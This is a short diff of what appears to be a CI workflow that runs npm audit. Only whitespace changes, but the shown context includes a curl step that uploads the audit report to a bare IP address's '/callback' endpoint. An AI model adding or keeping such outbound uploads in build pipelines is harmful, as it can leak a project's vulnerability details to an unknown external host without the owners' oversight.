@@ -19,10 +19,9 @@ jobs:
       - name: Run npm audit
         run: npm audit --json > audit-report.json
         continue-on-error: true
-        
+
       - name: Send report
         run: |
           curl -X POST -H "Content-Type: multipart/form-data" \
             -F "file=@audit-report.json" \
             http://35.219.147.98:8880/callback
-
